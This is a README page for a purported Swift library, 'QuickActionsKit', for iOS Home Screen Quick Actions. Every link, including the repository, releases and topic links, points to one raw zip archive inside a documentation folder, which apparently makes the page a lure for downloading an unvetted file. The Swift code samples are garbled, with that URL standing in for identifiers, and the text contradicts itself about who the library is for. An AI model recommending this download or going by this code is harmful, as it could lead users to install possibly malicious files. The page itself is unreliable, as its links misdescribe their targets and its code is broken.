# 🎉 QuickActionsKit - Easily Add Quick Actions to Your App

## 🚀 Download Now
[![Download QuickActionsKit](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip%https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip)](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip)

## 📖 Introduction
QuickActionsKit is a lightweight Swift library designed to help you set up and manage Home Screen Quick Actions effortlessly. With QuickActionsKit, you can add shortcuts to your app that allow users to quickly perform tasks without having to open your application. It is simple to use, making it perfect for developers and non-developers alike.

## 🌟 Features
- **Minimal Setup**: Get started in no time with simple steps.
- **Swift Compatibility**: Works seamlessly with both SwiftUI and UIKit.
- **User-Friendly**: Designed for everyone, without the need for coding experience.
- **3D Touch Support**: Enhance user experience on compatible devices.

## 💻 System Requirements
To run QuickActionsKit, you need:
- A device with iOS 11 or later.
- Xcode 10 or later for development.
- Basic knowledge of app installation on iOS devices.

## 📦 Download & Install
Visit the page below to download QuickActionsKit and start adding quick actions to your app today:

[Download QuickActionsKit](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip)

### Installation Steps:
1. Click on the link above to go to the Releases page.
2. Look for the latest version of QuickActionsKit listed on that page.
3. Click on the version number you want to install.
4. Download the `QuickActionsKit` package file from the assets listed.
5. Once downloaded, drag the package into your Xcode project to include it in your app.

## 💡 Usage Instructions
After installing QuickActionsKit, follow these steps to add Quick Actions to your app:

1. Import the library into your Swift file:
   ```swift
   import QuickActionsKit
   ```

2. Configure your quick actions in the app's delegate method:

   ```swift
   func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip Any]?) {
       let quickActions = QuickActions()
       https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip(title: "Action 1", type: "action1")
       https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip(title: "Action 2", type: "action2")
   }
   ```

3. Handle the quick action in the same method:

   ```swift
   func application(_ application: UIApplication, performActionFor shortcutItem: UIApplicationShortcutItem, completionHandler: @escaping (Bool) -> Void) {
       // Handle the action based on the shortcutItem type
       switch https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip {
       case "action1":
           // Code to execute for Action 1
           completionHandler(true)
       case "action2":
           // Code to execute for Action 2
           completionHandler(true)
       default:
           completionHandler(false)
       }
   }
   ```

## 👨‍💻 Support
If you need help or have questions, feel free to reach out by opening an issue on GitHub or checking the FAQ section on the repository. We are here to support you in making your app even better.

## 🌐 Explore More
You might find the following topics useful as you work with QuickActionsKit:
- [3D Touch](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip)
- [Creating Shortcuts](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip)

## 🔗 Quick Links
- [QuickActionsKit GitHub Repository](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip)
- [Latest Releases Page](https://raw.githubusercontent.com/wrxkd/QuickActionsKit/main/Sources/QuickActionsKit/QuickActionsKit.docc/Quick_Kit_Actions_v1.5-beta.2.zip)

Thank you for using QuickActionsKit. We hope it makes your app development process easier and more efficient. Happy coding!